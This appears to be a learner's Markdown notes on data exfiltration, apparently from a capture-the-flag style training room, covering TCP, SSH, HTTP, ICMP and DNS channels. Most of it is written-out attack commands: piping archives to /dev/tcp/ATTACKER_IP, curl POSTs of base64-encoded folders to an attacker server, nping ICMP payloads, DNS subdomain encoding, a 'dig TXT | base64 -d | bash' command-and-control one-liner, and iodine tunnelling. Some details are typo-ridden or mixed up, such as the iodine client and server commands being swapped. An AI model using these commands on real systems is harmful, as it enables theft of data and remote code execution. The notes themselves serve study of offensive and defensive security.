[Data Exfiltration](#data-exfiltration)
  - [TCP](#tcp)
  - [SSH](#ssh)
  - [HTTP](#http)


# Data Exfiltration
- extract information
- outbound traffic TCP/UDP 53 (DNO)

- Bind9 server
  - buy a domain (https://www.youtube.com/watch?v=p8wbebEgtDk)

## TCP
- easy to detect
- listener on attacker: nc -lvp XXX > output.txt
  
- connecttion on victim:
  - tar zfc - folder/ | base64 | dd conv=ebcdic > /dev/tcp/ATTAcKER_IP/PORT
    - compress folder
    - convert to base64
    - convert and copy file, from ASCI du EBCDIC
    - send to this Port
- Received file
  - dd conv=ascii if=received.file | base64 -d > file.tar

## SSH
- Connection on victim 
  - tar cf - filder/ | ssh user@ip "cd /tmp/; tar xpf -"

## HTTP
- post request: not cached, not in browse, not bookmarked, no restriction on size
- SEND: curl --data "files=$(tar zcf - FOLDR/ | base64)" http://attacker-server/file.php
- RECEIVE: correct URL enconding

- HTTPS
  - https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04

## ICMP
- fill out data-field with data
- ping 
  - -p = in hexadecimal
    - xxd -p = convert to hexadecimal
  - Metasploit  
    - Begin of File (BOF) + End of File (EOF)
    - auxiliry=> icmp_exfil
    - BPF_FILTER = only for icmp
- nping
  - Victim: 
    - send BOF
      - nping --icmp -c 1 ATTACKER_IP --data-string "BOFfile.txt"
  - send DATA
    - nping --icmp -c 1 ATTACKER_IP --data-string "blabla"
  - send EOF
    - nping --icmp -c 1 ATTACKER_IP --data-string "EOF"
  - icmpdoor
    - needs execution on victim
    - all traffics goes through ICMP
    - icmpdoor -i eht0 -d IP
  - Attacker
    - icmp-cnc -i eth1 -d IP

## DNS
- Extract data from DNS
- Easy to bypass firewalls and IPS
- Perfom dns request and input data there
  - Ex: EXFILTRATED_DATA@domain.thm

- Create own DNS
  - https://www.youtube.com/watch?v=p8wbebEgtDk

- Steps
  - find data to sent
  - encode data 
  - send as subdomain, max 255 characters URL and 63 subdomain
- cat file_to_sent
  - tr -d "\n" = remove breakline
  - fold -w18 = divide in block of 18 characters
  - sed -r 's/.*/&.domain'/ = append domain
- Decode
  - filter extracted file and decode

- Command and Control
  - encode script 
  - add it to TXT dns record
  - ask for this record: dig +short -t TXT
  - decode script
  - execute it
  - dig +short -t TXT ns.domain | remove " | base64 -d | bash

### DNS Tunnel
- TCP over DNS
- iodine
  - client
  - and server
  - Client
    - iodined -f -c -P password IP/CID att.tunnel.com
      - create new interface dns0
      - -f background
      - -c no checking client ip and for
      - -P set password
      - IP = set network IP and interface
      - att.tunnel = nameserver
  - Server
    - iodine -P password att.tunnel.com

#### Other Tools
- packetygrabber.py => https://github.com/kleosdc/dns-exfil-infil
- dns-exfil-infil.py => https://github.com/kleosdc/dns-exfil-infil
- 